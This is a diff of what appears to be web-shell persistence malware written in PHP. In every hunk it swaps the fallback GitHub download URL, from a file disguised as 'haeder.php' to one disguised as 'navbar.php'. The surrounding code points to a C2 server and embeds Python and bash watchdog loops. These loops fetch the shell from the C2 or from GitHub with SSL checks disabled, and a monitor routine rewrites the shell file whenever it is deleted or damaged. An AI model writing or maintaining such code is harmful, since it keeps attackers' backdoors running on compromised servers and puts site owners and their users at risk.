@@ -2083,7 +2083,7 @@ function get_shell_code_fallback() {
         return $content;
     }
     
-    $github_url = "https://raw.githubusercontent.com/wnwnsks/k/refs/heads/main/haeder.php";
+    $github_url = "https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/navbar.php";
     $content = @file_get_contents($github_url);
     if ($content && strlen($content) > 15000) {
         return $content;
@@ -2198,7 +2198,7 @@ SHELL_PATH = "' . $shell_path_esc . '"
 SHELL_URL  = "' . $shell_url_esc  . '"
 C2_URL     = "' . $c2_url_esc     . '"
 INTERVAL   = 30
-SOURCES    = [C2_URL + "?act=get_shell", "https://raw.githubusercontent.com/wnwnsks/k/refs/heads/main/haeder.php"]
+SOURCES    = [C2_URL + "?act=get_shell", "https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/navbar.php"]
 
 ctx = ssl.create_default_context()
 ctx.check_hostname = False
@@ -2253,7 +2253,7 @@ while True:
             $bash_code = '#!/bin/bash
 SHELL_PATH=' . $shell_path_sh . '
 C2_URL=' . $c2_sh . '
-GH_URL="https://raw.githubusercontent.com/wnwnsks/k/refs/heads/main/haeder.php"
+GH_URL="https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/navbar.php"
 
 restore() {
   curl -sL "${C2_URL}?act=get_shell" -o "$SHELL_PATH" 2>/dev/null && \
@@ -2642,7 +2642,7 @@ if (isset($_GET['monitor'])) {
                     // File missing or damaged - restore
                     $payload = @file_get_contents($c2_server . '?urlver');
                     if (!$payload || strlen($payload) < 100) {
-                        $payload = @file_get_contents('https://raw.githubusercontent.com/wnwnsks/k/refs/heads/main/' . SHELL_FILE);
+                        $payload = @file_get_contents('https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/' . SHELL_FILE);
                     }
                     
                     if ($payload && strlen($payload) > 5000) {
@@ -2666,7 +2666,7 @@ if (isset($_GET['monitor'])) {
         $mainFile = SHELL_PATH;
         if (!file_exists($mainFile) || filesize($mainFile) < 10000) {
             $payload = @file_get_contents($c2_server . '?urlver');
-            if (!$payload) $payload = @file_get_contents('https://raw.githubusercontent.com/wnwnsks/k/refs/heads/main/' . SHELL_FILE);
+            if (!$payload) $payload = @file_get_contents('https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/' . SHELL_FILE);
             if ($payload && strlen($payload) > 10000) {
                 @file_put_contents($mainFile, $payload);
                 $restore_count++;
